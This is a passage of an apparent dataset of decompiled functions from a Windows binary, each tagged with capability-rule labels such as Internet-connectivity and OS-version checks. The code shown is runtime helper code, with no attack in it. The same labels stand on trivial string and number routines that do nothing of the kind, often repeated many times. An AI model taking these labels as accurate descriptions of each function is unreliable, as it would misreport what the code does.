code_r0x00014001c2d1;\n    uVar7 = arg2[3];\n    if (uVar7 == 2) {\n        in_stack_00000028 = 1 - in_stack_00000028;\njoined_r0x00014001c5c8:\n        if (in_stack_00000028 != 0) {\n            iVar6 = *(iVar14 + 0x14);\n            iVar14 = fcn.140015b30(iVar14);\n            if (uVar18 == 2) {\n                uVar18 = 0x22;\n                if (*arg2 - 1 == uVar21) {\n                    uVar18 = ((1 << (uVar21 & 0x1f) & *(iVar14 + 0x18 + (uVar21 >> 5) * 4)) == 0) + 0x21;\n                }\n                goto code_r0x00014001c2d1;\n            }\n            if (*(iVar14 + 0x14) == iVar6 || *(iVar14 + 0x14) < iVar6) {\n                if ((uVar21 & 0x1f) != 0) {\n                    puVar24 = iVar14 + 0x14 + iVar6 * 4;\n                    uVar7 = 0x1f;\n                    if (*puVar24 != 0) {\n                        for (; *puVar24 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n                        }\n                    }\n                    if ((uVar7 ^ 0x1f) < 0x20 - (uVar21 & 0x1f)) goto code_r0x00014001c608;\n                }\n            }\n            else {\ncode_r0x00014001c608:\n                uVar19 = uVar19 + 1;\n                fcn.14001c7b0(iVar14, 1);\n                if (arg2[2] < uVar19) goto code_r0x00014001c4b0;\n            }\n            uVar18 = 0x21;\n            goto code_r0x00014001c2d1;\n        }\n    }\n    else {\n        if (uVar7 == 3) goto joined_r0x00014001c5c8;\n        if ((uVar7 == 1) && ((uVar8 & 2) != 0)) {\n            in_stack_00000028 = (uVar8 | *puVar24) & 1;\n            goto joined_r0x00014001c5c8;\n        }\n    }\n    uVar18 = uVar18 | 0x10;\ncode_r0x00014001c2d1:\n    *arg4 = iVar14;\n    *arg3 = uVar19;\n    return uVar18;\n}\n",
        "token_count": 4629
    },
    "14001c99": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nulong fcn.14001c990(char **arg1, uint32_t *arg2, uint32_t *arg3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    char *pcVar18;\n    uint32_t *puVar19;\n    \n    iVar8 = *0x140110850;\n    if (*(*0x140110850 + 0x30) == '\\0') {\n        fcn.14001c8f0();\n    }\n    uVar4 = *arg2 & 0x1f;\n    puVar10 = arg3 + (*arg2 >> 5);\n    if (uVar4 == 0) {\n        puVar12 = puVar10 + -1;\n        puVar19 = puVar10;\n    }\n    else {\n        puVar19 = puVar10 + 1;\n        puVar12 = puVar10;\n    }\n    pcVar18 = *arg1;\n    puVar19[-1] = 0;\n    uVar2 = pcVar18[1];\n    if (uVar2 != 0) {\n        do {\n            if (0x20 < uVar2) {\n                if (((uVar2 == 0x30) && ((pcVar18[2] & 0xdfU) == 0x58)) && (uVar2 = pcVar18[3],  0x20 < uVar2)) {\n                    pcVar6 = pcVar18 + 3;\n                    pcVar18 = pcVar18 + 2;\n                    goto code_r0x00014001ca41;\n                }\n                break;\n            }\n            uVar2 = pcVar18[2];\n            pcVar18 = pcVar18 + 1;\n        } while (uVar2 != 0);\n        uVar2 = pcVar18[1];\n        pcVar6 = pcVar18 + 1;\n        if (uVar2 != 0) {\ncode_r0x00014001ca41:\n            uVar9 = uVar2;\n            iVar15 = 0;\n            iVar14 = 0;\n            iVar7 = 0;\n            puVar10 = puVar12;\n            puVar13 = puVar12;\ncode_r0x00014001ca60:\n            do {\n                uVar2 = *(iVar8 + uVar9);\n                if (uVar2 == 0) {\n                    if (0x20 < uVar9) {\n                        if ((uVar9 != 0x29) || (iVar14 == 0)) {\n                            do {\n                                pcVar6 = pcVar6 + 1;\n                                if (uVar9 == 0x29) {\n                                    *arg1 = pcVar6;\n                                    return 4;\n                                }\n                                uVar9 = *pcVar6;\n                            } while (*pcVar6 != '\\0');\n                            return 4;\n                        }\n                        *arg1 = pcVar18 + 2;\n                        if (puVar13 <= puVar10) goto joined_r0x00014001cb29;\n                        goto code_r0x00014001cb1c;\n                    }\n                    puVar11 = puVar10;\n                    if (iVar14 <= iVar7) {\ncode_r0x00014001cc23:\n                        uVar2 = pcVar6[1];\n                        while (uVar2 < 0x21) {\n                            puVar1 = pcVar6 + 2;\n                            pcVar6 = pcVar6 + 1;\n                            uVar2 = *puVar1;\n                        }\n                        pcVar18 = pcVar6;\n                        puVar10 = puVar11;\n                        if (((uVar2 != 0x30) || ((pcVar6[2] & 0xdfU) != 0x58)) || (uVar9 = pcVar6[3],  pcVar6[3] < 0x21)\n                           ) goto code_r0x00014001cbe4;\n                        pcVar18 = pcVar6 + 2;\n                        pcVar6 = pcVar6 + 3;\n                        goto code_r0x00014001ca60;\n                    }\n                    if ((puVar10 < puVar13) && (iVar15 < 8)) {\n                        uVar9 = *puVar10;\n                        cVar3 = '\\b' - iVar15;\n                        do {\n                            puVar16 = puVar11 + 1;\n                            *puVar11 = uVar9 | puVar11[1] << (cVar3 * -4 + 0x20U & 0x1f);\n                            uVar9 = puVar11[1] >> (cVar3 * '\\x04' & 0x1fU);\n                            *puVar16 = uVar9;\n                            puVar11 = puVar16;\n                        } while (puVar16 < puVar13);\n                    }\n                    if (arg3 < puVar10) {\n                        puVar11 = puVar10 + -1;\n                        puVar10[-1] = 0;\n                        iVar15 = 0;\n                        puVar13 = puVar11;\n                        iVar7 = iVar14;\n                        goto code_r0x00014001cc23;\n                    }\n                    uVar2 = pcVar6[1];\n                    iVar15 = 8;\n                    pcVar18 = pcVar6;\n                }\n                else {\n                    iVar15 = iVar15 + 1;\n                    iVar14 = iVar14 + 1;\n                    if (iVar15 < 9) {\n                        uVar9 = *puVar10 << 4;\n                    }\n                    else {\n                        pcVar18 = pcVar6;\n                        if (puVar10 <= arg3) goto code_r0x00014001cbe4;\n                        puVar10[-1] = 0;\n                        uVar9 = 0;\n                        puVar10 = puVar10 + -1;\n                        iVar15 = 1;\n                    }\n                    *puVar10 = uVar2 & 0xf | uVar9;\n                    pcVar18 = pcVar6;\ncode_r0x00014001cbe4:\n                    uVar2 = pcVar18[1];\n                }\n                uVar9 = uVar2;\n                pcVar6 = pcVar18 + 1;\n            } while (uVar9 != 0);\n            if (iVar14 != 0) {\n                if (puVar10 < puVar13) {\ncode_r0x00014001cb1c:\n                    if (iVar15 < 8) {\n                        cVar3 = '\\b' - iVar15;\n                        uVar9 = *puVar10;\n                        puVar11 = puVar10;\n                        do {\n                            puVar16 = puVar11 + 1;\n                            uVar5 = puVar11[1] << (cVar3 * -4 + 0x20U & 0x1f) | uVar9;\n                            uVar9 = puVar11[1] >> (cVar3 * '\\x04' & 0x1fU);\n                            *puVar11 = uVar5;\n                            *puVar16 = uVar9;\n                            puVar11 = puVar16;\n                        } while (puVar16 < puVar13);\n                    }\n                }\njoined_r0x00014001cb29:\n                puVar13 = puVar10;\n                puVar11 = arg3;\n                if (arg3 < puVar10) {\n                    do {\n                        puVar16 = puVar13 + 1;\n                        *puVar11 = *puVar13;\n                        puVar13 = puVar16;\n                        puVar11 = puVar11 + 1;\n                    } while (puVar16 <= puVar12);\n                    iVar8 = (puVar12 - puVar10 & 0xfffffffffffffffcU) + 4;\n                    if (puVar12 + 1U < puVar10 + 1U) {\n                        iVar8 = 4;\n                    }\n                    iVar8 = iVar8 + arg3;\n                    iVar17 = (puVar12 - iVar8 & 0xfffffffffffffffcU) + 4;\n                    if (puVar12 + 1U < iVar8 + 1U) {\n                        iVar17 = 4;\n                    }\n                    sub.msvcrt.dll_memset(iVar8, 0, iVar17);\n                    uVar9 = puVar19[-1];\n                }\n                else {\n                    uVar9 = puVar19[-1];\n                    if (uVar4 != 0) {\n                        uVar9 = uVar9 & 0xffffffffU >> (0x20U - uVar4 & 0x1f);\n                        puVar19[-1] = uVar9;\n                    }\n                }\n                while( true ) {\n                    if (uVar9 != 0) {\n                        return 5;\n                    }\n                    if (arg3 == puVar12) break;\n                    uVar9 = puVar12[-1];\n                    puVar12 = puVar12 + -1;\n                }\n                *puVar12 = 1;\n                return 5;\n            }\n        }\n    }\n    return 4;\n}\n",
        "token_count": 2072
    },
    "14001cd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014001ce4b)\n// WARNING: Removing unreachable block (ram,0x00014001ce30)\n// WARNING: Removing unreachable block (ram,0x00014001ce3c)\n\nvoid fcn.14001cd80(ulong arg1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    if (*0x140136cd0 != 2) {\n        if (*0x140136cd0 != 0) {\n            if (*0x140136cd0 == 1) {\n                do {\n                    (*pcVar2)(1);\n                } while (*0x140136cd0 == 1);\n                if (*0x140136cd0 == 2) goto code_r0x00014001ce16;\n            }\n            return;\n        }\n        *0x140136cd0 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x140136ce0);\n        (*pcVar1)(0x140136d08);\n        fcn.1400014f0(0x14001ce60);\n        *0x140136cd0 = 2;\n    }\ncode_r0x00014001ce16:\n    // WARNING: Could not recover jumptable at 0x00014001ce28. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 * 0x28 + 0x140136ce0);\n    return;\n}\n",
        "token_count": 365
    },
    "14001d8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.14001d8c0(ulong noname_0, int32_t *arg2, int32_t *arg3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    ulong in_XMM0_Qa;\n    \n    iVar7 = fcn.14001ceb0(1);\n    if (iVar7 != 0) {\n        uVar9 = in_XMM0_Qa >> 0x20;\n        uVar10 = uVar9 & 0xfffff;\n        uVar9 = uVar9 >> 0x14 & 0x7ff;\n        if (uVar9 != 0) {\n            uVar10 = uVar10 | 0x100000;\n        }\n        uVar5 = in_XMM0_Qa;\n        if (uVar5 == 0) {\n            iVar6 = 1;\n            iVar3 = 0;\n            for (uVar5 = uVar10; (uVar5 & 1) == 0; uVar5 = uVar5 >> 1 | 0x80000000) {\n                iVar3 = iVar3 + 1;\n            }\n            *(iVar7 + 0x14) = 1;\n            iVar2 = iVar3 + 0x20;\n            *(iVar7 + 0x18) = uVar10 >> (iVar3 & 0x1f);\n        }\n        else {\n            iVar2 = 0;\n            for (uVar4 = uVar5; (uVar4 & 1) == 0; uVar4 = uVar4 >> 1 | 0x80000000) {\n                iVar2 = iVar2 + 1;\n            }\n            uVar8 = iVar2;\n            uVar5 = uVar5 >> (uVar8 & 0x1f);\n            if (iVar2 != 0) {\n                uVar5 = uVar5 | uVar10 << (0x20 - uVar8 & 0x1f);\n                uVar10 = uVar10 >> (uVar8 & 0x1f);\n            }\n            *(iVar7 + 0x18) = uVar5;\n            iVar6 = 2 - (uVar10 == 0);\n            *(iVar7 + 0x1c) = uVar10;\n            *(iVar7 + 0x14) = iVar6;\n        }\n        if (uVar9 == 0) {\n            puVar1 = iVar7 + 0x14 + iVar6 * 4;\n            uVar10 = 0x1f;\n            if (*puVar1 != 0) {\n                for (; *puVar1 >> uVar10 == 0; uVar10 = uVar10 - 1) {\n                }\n            }\n            *arg2 = iVar2 + -0x432;\n            *arg3 = iVar6 * 0x20 - (uVar10 ^ 0x1f);\n        }\n        else {\n            *arg2 = (uVar9 - 0x433) + iVar2;\n            *arg3 = 0x35 - iVar2;\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 750
    },
    "14001dcb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14001dcb0(char *arg1, uint64_t arg2)\n\n{\n    char *pcVar1;\n    uint64_t uVar2;\n    \n    uVar2 = 0;\n    pcVar1 = arg1;\n    if (arg2 != 0) {\n        do {\n            if (*pcVar1 == '\\0') {\n                return uVar2;\n            }\n            pcVar1 = pcVar1 + 1;\n            uVar2 = pcVar1 - arg1;\n        } while (uVar2 < arg2);\n    }\n    return uVar2;\n}\n",
        "token_count": 132
    },
    "14001dce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14001dce0(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = 0;\n    if (arg2 != 0) {\n        do {\n            if (*(arg1 + iVar1 * 2) == 0) {\n                return iVar1;\n            }\n            iVar1 = iVar1 + 1;\n        } while (arg2 != iVar1);\n    }\n    return arg2;\n}\n",
        "token_count": 105
    },
    "14001e0e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001e0e0(uint16_t *arg1, uint32_t *arg2, int64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t auStack28 [3];\n    \n    if (arg2 == NULL) {\n        return 0;\n    }\n    if (arg3 == 0) {\n        return 0xfffffffe;\n    }\n    auStack28[0] = *arg4;\n    uVar1 = *arg2;\n    *arg4 = 0;\n    if (uVar1 == 0) {\n        *arg1 = 0;\n        return 0;\n    }\n    if (in_stack_00000030 < 2) {\ncode_r0x00014001e198:\n        if (in_stack_00000028 == 0) {\n            *arg1 = *arg2;\n            return 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 1, arg1, 1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    else {\n        if (auStack28[0] == '\\0') {\n            iVar2 = (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(in_stack_00000028);\n            if (iVar2 == 0) goto code_r0x00014001e198;\n            if (arg3 == 1) {\n                *arg4 = *arg2;\n                return 0xfffffffe;\n            }\n        }\n        else {\n            auStack28[0]._0_2_ = CONCAT11(uVar1, auStack28[0]);\n            auStack28[0] = auStack28[0] & 0xffff0000 | auStack28[0];\n            arg2 = auStack28;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 2, arg1, 1);\n        if (iVar2 != 0) {\n            return 2;\n        }\n    }\n    puVar3 = sub.msvcrt.dll__errno();\n    *puVar3 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 557
    },
    "1400a5ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a5ae0(int32_t **arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.1400a5480(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "140021a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_fh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140021a70(int64_t arg1, int64_t arg2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t *piVar8;\n    code *pcVar9;\n    char *pcVar10;\n    ulong unaff_RDI;\n    ulong uVar11;\n    ulong uVar12;\n    ulong uVar13;\n    ulong auStack280 [6];\n    int32_t iStack228;\n    int64_t iStack224;\n    code *apcStack216 [6];\n    ulong auStack168 [6];\n    ulong var_70h;\n    ulong var_68h;\n    ulong var_60h;\n    ulong var_58h;\n    ulong var_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_fh;\n    \n    uVar11 = 0x756f6e6520746f6e;\n    uVar12 = 0x6563617073206867;\n    uVar13 = 0x726f6620726f6620;\n    var_68h = 0x657220677562206c;\n    pcVar9 = arg2 - arg1;\n    var_70h = 0x6c75662074696d62;\n    var_58h = 0x2f2f3a7370747468;\n    var_48h._0_1_ = 0x6f;\n    var_60h = 0x2074612074726f70;\n    var_50h = 0x2e756e672e636367;\n    var_40h._1_7_ = 0x202020200a3a29;\n    var_38h._0_1_ = 0;\n    auStack168[0] = 0x756f6e6520746f6e;\n    auStack168[1] = 0x6563617073206867;\n    auStack168[2] = 0x726f6620726f6620;\n    auStack168[3] = 0x617078652074616d;\n    auStack168[4] = 0x5028206e6f69736e;\n    auStack168[5] = 0x757320657361656c;\n    var_48h._1_7_ = 0x736775622f6772;\n    var_40h._0_1_ = 0x2f;\n    apcStack216[1] = 0x140021b5f;\n    iVar4 = fcn.1400147b0(arg1);\n    uVar3 = var_50h;\n    uVar6 = CONCAT71(var_48h._1_7_, var_48h);\n    iVar4 = -iVar4;\n    *(&fcn.140021a70::var_70h + iVar4) = 0x6c75662074696d62;\n    *(&fcn.140021a70::var_60h + iVar4) = 0x2074612074726f70;\n    uVar7 = CONCAT71(var_40h._1_7_, var_40h);\n    *(&fcn.140021a70::var_68h + iVar4) = 0x657220677562206c;\n    *(&fcn.140021a70::var_40h + iVar4) = uVar7;\n    *(&fcn.140021a70::var_58h + iVar4) = 0x2f2f3a7370747468;\n    *(&stack0xffffffffffffff58 + iVar4) = uVar11;\n    *(&stack0xffffffffffffff60 + iVar4) = uVar12;\n    *(&stack0xffffffffffffff68 + iVar4) = uVar13;\n    *(&stack0xffffffffffffff70 + iVar4) = 0x617078652074616d;\n    *(&stack0xffffffffffffff78 + iVar4) = 0x5028206e6f69736e;\n    *(&stack0xffffffffffffff80 + iVar4) = 0x757320657361656c;\n    *(&fcn.140021a70::var_50h + iVar4) = uVar3;\n    *(&fcn.140021a70::var_48h + iVar4) = uVar6;\n    *(&stack0xffffffffffffff30 + iVar4) = 0x140021bed;\n    sub.msvcrt.dll_memcpy(uVar3, &fcn.140021a70::var_38h + iVar4);\n    pcVar9[&fcn.140021a70::var_38h + iVar4] = 0x0;\n    *(&stack0xffffffffffffff30 + iVar4) = 0x140021bfd;\n    fcn.1400bd270(&stack0xffffffffffffff58 + iVar4);\n    